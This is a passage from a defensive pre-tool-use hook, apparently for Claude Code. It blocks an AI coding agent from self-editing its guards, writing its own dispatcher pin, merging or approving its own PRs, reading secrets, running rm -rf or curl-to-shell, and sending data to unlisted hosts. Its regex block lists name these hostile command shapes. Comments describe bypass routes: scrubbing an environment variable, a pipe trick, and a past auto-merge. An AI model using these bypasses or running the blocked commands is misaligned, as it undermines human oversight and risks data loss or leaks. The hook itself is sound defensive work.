# a session is not supposed to be able to author (docs/PIPELINE-CONTRACT.md §3).
# The script refuses to run when it detects an agent environment, but its own
# docstring calls that tamper-EVIDENT, not tamper-proof: a session runs as the same
# user and can scrub `CLAUDECODE` out of the environment before invoking it. Real
# enforcement belongs here, where the model cannot reach.
#
# What a self-placed pin would buy: retargeting this session at another ticket,
# widening its own scope fence, or minting a fresh expiry on a lapsed binding.
# `--selftest` is exempt — it writes only into temp dirs and is how CI and the
# battery verify the script (`npm run test:local-dispatch`).
LOCAL_DISPATCH_RE = re.compile(r"(?<![\w.-])pipeline_dispatch_local\.py(?![\w-])")
LOCAL_DISPATCH_READ_RE = re.compile(
    r"(?<![\w-])(?:cat|bat|less|more|head|tail|grep|rg|wc|file|stat|git|ls)(?![\w-])"
)


def _invokes_local_dispatch(scan: str) -> bool:
    """Does this command RUN the pin writer (rather than read it)?

    Per SEGMENT, and that is the whole point. A whole-command read-verb test was
    trivially defeated by a pipe: `python3 …pipeline_dispatch_local.py TOD-90 |
    head -3` mentions `head`, so the guard read the invocation as a read and let it
    through. Splitting on the shell's own separators puts `head -3` in its OWN
    segment, where it no longer speaks for the segment that actually runs the
    script. Found by running the real command against the live guard, not by the
    battery — the original cases had no pipes.
    """
    if not LOCAL_DISPATCH_RE.search(scan):
        return False
    for seg in re.split(r"[|;&\n]+", scan):
        if not LOCAL_DISPATCH_RE.search(seg):
            continue                      # this segment merely pipes to something
        if "--selftest" in seg:
            continue                      # temp-dir only; CI and the battery run it
        if LOCAL_DISPATCH_READ_RE.search(seg):
            continue                      # cat/grep/git-log of the script itself
        return True
    return False
LOCAL_DISPATCH_HELP = (
    "`scripts/pipeline_dispatch_local.py` writes the dispatcher PIN, and a session "
    "that can place its own pin can retarget itself at another ticket, widen its own "
    "scope fence, or renew a lapsed binding (docs/PIPELINE-CONTRACT.md §3 — the pin "
    "is the one binding the agent must not author). A HUMAN runs it, from their own "
    "terminal:\n"
    "  python3 scripts/pipeline_dispatch_local.py <TICKET-ID>\n"
    "The script's own agent-environment check is tamper-EVIDENT, not tamper-proof "
    "(same user, same environment), which is why this block lives in the hook. "
    "Reading the script, and `--selftest`, are still allowed."
)


def _dispatch(data):
    """All tool guards. Runs inside the fail-closed boundary (see module docstring)."""
    tool = data.get("tool_name", "")
    inp = data.get("tool_input", {})

    # ── Self-edit guard (Edit/Write/NotebookEdit) — GAP 1 ───────────────────────
    if tool in ("Edit", "Write", "NotebookEdit"):
        _p = inp.get("file_path") or inp.get("notebook_path") or ""
        if _is_self_guard_path(_p):
            block(SELF_EDIT_HELP.format(path=_p))
        # The git metadata store is part of the config anchor: a ref file rewritten
        # with Edit/Write moves it exactly as `git update-ref` would.
        if _in_git_store(_p):
            block(CONFIG_ANCHOR_HELP)

    # ── Cross-worktree write guard ──────────────────────────────────────────────
    if tool in ("Edit", "Write"):
        _fp = inp.get("file_path", "")
        _owner = _owning_worktree(_fp, _worktree_roots()) if _fp else None
        if _owner and os.path.abspath(_owner) != os.path.abspath(PROJECT_ROOT):
            try:
                _suggested = os.path.join(
                    PROJECT_ROOT, os.path.relpath(os.path.abspath(_fp), _owner)
                )
            except Exception:
                _suggested = os.path.join(PROJECT_ROOT, "<same-relative-path>")
            block(CROSS_WORKTREE_HELP.format(owner=_owner, here=PROJECT_ROOT, suggested=_suggested))

    # ── Branch guards ───────────────────────────────────────────────────────────
    if tool in ("Edit", "Write") and _in_project(inp.get("file_path", "")):
        branch = _current_branch()
        if branch in PROTECTED_BRANCHES:
            block(BRANCH_HELP.format(branch=branch))
        elif branch and not BRANCH_NAME_RE.match(branch):
            block(BRANCH_NAME_HELP.format(branch=branch))

    # _strip_prose site 2 of 4: a commit message quoting "git commit" (or a PR body
    # quoting a filename) is prose, not a second operation.
    if tool == "Bash" and re.search(
        r"\bgit\s+commit\b", _strip_prose(inp.get("command", ""))
    ):
        branch = _current_branch()
        if branch in PROTECTED_BRANCHES:
            block(BRANCH_HELP.format(branch=branch))
        elif branch and not BRANCH_NAME_RE.match(branch):
            block(BRANCH_NAME_HELP.format(branch=branch))
        elif _has_upstream():
            merged = _merged_pr_info(branch)
            if merged:
                block(MERGED_PR_HELP.format(branch=branch, number=merged["number"]))

    # ── Bash ────────────────────────────────────────────────────────────────────
    if tool == "Bash":
        cmd = inp.get("command", "")
        scan = _strip_prose(cmd)          # _strip_prose site 1 of 4

        # ── Local-dispatch guard: a session may not write its own pin ───────────
        if _invokes_local_dispatch(scan):
            block(LOCAL_DISPATCH_HELP)

        # Block rm -rf / rm -fr / rm --recursive --force
        # The short-flag run must START an argument token (whitespace or an
        # opening quote before the dash): unanchored, interior dashes in
        # FILENAMES matched too and false-blocked plain `rm` — e.g.
        # probe-future-date.ts (-futur ~ -f..r), build-for-prod.txt (-for).
        if re.search(r"\brm\b[^#\n;&|]*(?:^|[\s'\"])-[a-zA-Z]*r[a-zA-Z]*f", scan) or \
           re.search(r"\brm\b[^#\n;&|]*(?:^|[\s'\"])-[a-zA-Z]*f[a-zA-Z]*r", scan) or \
           re.search(r"\brm\b[^#\n;&|]*--recursive", scan):
            block(
                "rm -rf / rm --recursive detected — use specific paths or ask Braeden to confirm."
            )

        # Block curl/wget piped directly to a shell
        if re.search(
            r"(curl|wget)\s[^|\n]*\|\s*(bash|sh|zsh|fish|python3?|ruby|perl)", scan
        ):
            block(
                "Piping curl/wget into a shell is a supply-chain risk. "
                "Download first, inspect, then run."
            )

        # ── Self-edit guard (Bash arm) — GAP 1 ──────────────────────────────────
        # Stop shell-side rewrites of the guard machinery: redirection INTO it, an
        # in-place/writing command targeting it, or a git working-tree rewrite of it.
        # `git add`/`git commit`/reads are intentionally NOT matched, so this very
        # session can still stage & commit a legitimately-authored hook change.
        # Scoped to THIS project's machinery and to genuine MUTATIONS — see
        # _mutate_re (reads like `sed -n '1,70p'` are not rewrites) and
        # _bash_targets_own_guard (another checkout's hooks are not ours).
        if _bash_targets_own_guard(scan):
            block(SELF_EDIT_BASH_HELP)

        # ── Config-anchor guard (Bash arm) — TOD-111 ────────────────────────────
        # Writing a protected ref, repointing `origin`, or mutating `.git/**` is
        # human-only (see CONFIG_ANCHOR_HELP). `git config --get remote.origin.url`
        # is a read and stays allowed, as does a plain `git fetch`.
        if (_GIT_STORE_MUTATE_RE.search(scan)
                or any(_r.search(scan) for _r in _REF_WRITE_RES)
                or (_GIT_CONFIG_REMOTE_RE.search(scan)
                    and not _GIT_CONFIG_READ_RE.search(scan))):
            block(CONFIG_ANCHOR_HELP)

        # Block staging planning/ or real .env files
        if re.search(r"\bgit\s+add\b[^#\n;&|]*(planning/|\.env(?!\.example))", scan):
            block(
                "Staging planning/ or .env files is forbidden — "
                "these paths are gitignored to prevent leaks."
            )

        # Push guard v2 (retro 2026-07-03): protect main/master from ANY push;
        # elsewhere allow the safe `--force-with-lease` (refuses to clobber unseen
        # remote commits) but block bare `--force`/`-f`. GitHub branch protection is
        # the server-side backstop for anything this heuristic misses.
        _push = re.search(r"\bgit\s+push\b([^#\n;&|]*)", scan)
        if _push:
            _seg = _push.group(1)
            if re.search(r"[\s:](main|master)(?![\w./-])", _seg):
                block("Pushing to main/master is not allowed. Use a feature branch + PR.")
            if re.search(r"(^|\s)--force(?!-with-lease\b)\b", _seg) or re.search(
                r"(^|\s)-f\b", _seg
            ):
                block(
                    "Bare --force/-f push is blocked — use `git push --force-with-lease`, "
                    "which refuses to overwrite remote commits you haven't seen."
                )
            branch = _current_branch()
            if branch not in PROTECTED_BRANCHES and _has_upstream():
                merged = _merged_pr_info(branch)
                if merged:
                    block(MERGED_PR_HELP.format(branch=branch, number=merged["number"]))

        # Merging a PR (with or without --auto) is Braeden's action only — Claude
        # opens PRs and stops there (2026-07-03: `gh pr merge --auto` was briefly used
        # to auto-merge Claude-opened PRs before being corrected). `--disable-auto` is
        # exempted since it only *undoes* an auto-merge, never causes one.
        _gh_merge = re.search(r"\bgh\s+pr\s+merge\b([^#\n;&|]*)", scan)
        if _gh_merge and "--disable-auto" not in _gh_merge.group(1):
            block(
                "`gh pr merge` (including --auto) is not allowed — merging PRs is "
                "Braeden's action only. Open the PR (`gh pr create`) and stop there. "
                "(`gh pr merge --disable-auto` is still allowed, to undo an auto-merge "
                "that shouldn't have been enabled.)"
            )

        # ── PR self-approval guard — TOD-111 ────────────────────────────────────
        # Approving a pull request is a SIGNAL TO A HUMAN that someone else looked
        # at the work — the same class of action as merging it, and the same answer.
        _approval = _self_approval_in(scan)
        if _approval:
            block(SELF_APPROVAL_PR_HELP.format(why=_SELF_APPROVAL_PR_WHY[_approval]))

        # ── Protected-label guard — TOD-111 ─────────────────────────────────────
        # Applying (or removing) a protected label is an ACKNOWLEDGEMENT, and an
        # acknowledgement is Braeden's action for the same reason a merge is: it
        # grants permission to the very change the session is proposing.
        _bad_label = _protected_label_in(scan)
        if _bad_label:
            block(PROTECTED_LABEL_HELP.format(label=_bad_label))

        # ── Secret-file read/source guard (Bash) — GAP 2 ────────────────────────
        # Target the sensitive PATH, not a list of reader verbs (see SENSITIVE_PATH_RE).
        if SENSITIVE_PATH_RE.search(scan):
            block(
                "This command references a secret file (.env / *.pem / *.key / id_rsa / "
                "credentials). Reading, sourcing, or dumping secrets into the shell is "
                "not allowed — reference values by env-var NAME only. (.env.example is fine.)"
            )

        # ── Egress / exfiltration guard — GAP 3 ─────────────────────────────────
        if NET_TOOL_RE.search(scan):
            unknown = sorted({h for h in _egress_hosts(scan) if not _host_allowlisted(h)})
            if unknown:
                exfil_shape = (
                    re.search(r"(?<![\w-])(?:-d|--data|--data-\w+|--post-\w+|-F|--form|-T|--upload-file)(?![\w-])", scan)
                    or re.search(r"(?<![\w-])-X\s*(?:POST|PUT|PATCH)(?![\w-])", scan, re.IGNORECASE)
                    or re.search(r"[=\s]@[\w./~+-]+", scan)  # curl @file payload
                    or re.search(r"://[^\s'\"]*\$", scan)  # $VAR spliced into the URL
                    or re.search(r"(?<![\w-])(?:scp|sftp|nc|ncat|netcat)(?![\w-])", scan)  # inherently outbound
                )
                if exfil_shape:
                    block(
                        "Egress blocked — a network tool is targeting a non-allowlisted host "
                        "({hosts}) with an upload/data flag, an @file payload, a $var-in-URL, "
                        "or a raw socket/scp push. This is the shape of data exfiltration. "
                        "Allowed hosts: localhost, *.github.com, api.anthropic.com, "
                        "*.supabase.co/.com. Download-then-inspect from a trusted host instead."
                        .format(hosts=", ".join(unknown))
                    )

        # ── Guard PROD/REMOTE databases from destructive ops ────────────────────
        # The local Supabase stack (Docker, 127.0.0.1) is disposable — resetting it is
        # routine and stays allowed. Production is irreplaceable, so the catastrophic
        # remote operations are blocked here (defence against a fat-fingered command by
        # Claude *or* a human). Prod changes go through reviewed, reversible migrations.

        # `supabase db reset` wipes the database. Local is fine; --linked / --db-url
        # target a REMOTE db and would destroy it.
        if re.search(r"\bsupabase\b[^#\n]*\bdb\s+reset\b", scan) and \
           re.search(r"--linked\b|--db-url\b", scan):
            block(
                "`supabase db reset` against a linked/remote database wipes it. "
                "Only the local (Docker) reset is allowed; change prod via reviewed, "
                "reversible migrations."
            )

        # Deleting a hosted Supabase project is irreversible.
        if re.search(r"\bsupabase\b[^#\n]*\bprojects?\s+delete\b", scan):
            block("`supabase projects delete` is irreversible and is not allowed.")

        # Raw destructive SQL (DROP / TRUNCATE / DELETE) aimed at a NON-localhost
        # Postgres host — e.g. psql against a remote connection string. A postgres URL
        # whose host is not localhost/127.0.0.1 alongside a destructive verb is blocked.
        if re.search(r"\b(drop|truncate|delete)\b", scan, re.IGNORECASE) and re.search(
            r"postgres(?:ql)?://[^\s'\"]*@(?!(?:localhost|127\.0\.0\.1|0\.0\.0\.0))",
            scan,
            re.IGNORECASE,
        ):
            block(
                "Destructive SQL (DROP/TRUNCATE/DELETE) against a remote database is "
                "blocked. Run destructive changes only on the local DB, via migrations."
            )

    # ── Read ────────────────────────────────────────────────────────────────────
    if tool == "Read":
        path = inp.get("file_path", "")
        basename = os.path.basename(path)

        if re.match(r"^\.env", basename) and not basename.endswith(".example"):
            block(
                f"Reading {basename} is blocked — it may contain real secrets. "
                "Reference env vars by name only."
            )
        if re.search(r"\.(pem|key)$", basename):
            block(f"Reading {basename} is blocked — private key files are off-limits.")
        if SENSITIVE_BASENAME_RE.search(basename):
            block(
                f"Reading {basename} is blocked — SSH keys and cloud credential "
                "files are off-limits. Reference secrets by env-var name only."
            )

    # ── Edit / Write ────────────────────────────────────────────────────────────
    if tool in ("Edit", "Write"):
        path = inp.get("file_path", "")
        basename = os.path.basename(path)

        # Block writing to real .env files
        if re.match(r"^\.env", basename) and not basename.endswith(".example"):
            block(
                f"Writing to {basename} is blocked. "
                "Only .env.example (with placeholder values) is committed."
            )
        # Block writing SSH-key / cloud-credential files
        if SENSITIVE_BASENAME_RE.search(basename):
            block(
                f"Writing {basename} is blocked — SSH keys and cloud credential "
                "files are human-managed; Claude never creates or edits them."
            )

        # Block embedding secret values in any file content
        content = inp.get("new_string", "") or inp.get("content", "")
        BANNED_VALUE_PATTERNS = [
            (r"sk-ant-[a-zA-Z0-9\-_]{20,}", "Anthropic API key (sk-ant-…)"),
            (r"(?:supabase|postgres)://[^:@\s]+:[^@\s]{8,}@", "DB connection string with password"),
            (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "Private key block"),
            (r"(?:AKID|AKIA)[A-Z0-9]{16}", "AWS access key"),
            (r"gh[pousr]_[A-Za-z0-9_]{36,}", "GitHub personal access token"),
            (r"eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}", "JWT token value"),
        ]
        for pattern, kind in BANNED_VALUE_PATTERNS:
            if re.search(pattern, content):
                block(
                    f"Secret value pattern detected in file content ({kind}). "
                    "Reference secrets by env var name only — never embed values."
                )

    # ── Pipeline guards (LAST) ──────────────────────────────────────────────────
    # Deliberately last, so a universal guard's message always wins: on a protected
    # branch the agent should be told to branch, not handed a pipeline diagnostic.
    # Inert unless `delivery.json` exists — see the section header above.
    _pipeline_guards(tool, inp)


# ── Entry point ─────────────────────────────────────────────────────────────────
try:
    data = json.load(sys.stdin)
except Exception:
    # A totally unparseable payload isn't a tool call we can reason about (and the
    # harness — not the model — builds this stdin), so there's nothing to block.
    sys.exit(0)

# GAP 4: fail CLOSED. If a security matcher raises on a crafted/unexpected
# tool_input, block (exit 2) instead of crashing to exit 1 (which Claude Code would
# treat as non-blocking → the tool would run). The workflow guards inside swallow
# their own errors, so only genuine security-check failures reach here.
try:
    _dispatch(data)
except SystemExit:
    raise  # an explicit allow/deny already decided
except Exception as exc:
    block(f"pre-tool-use security hook errored ({type(exc).__name__}); failing closed (deny)")

sys.exit(0)
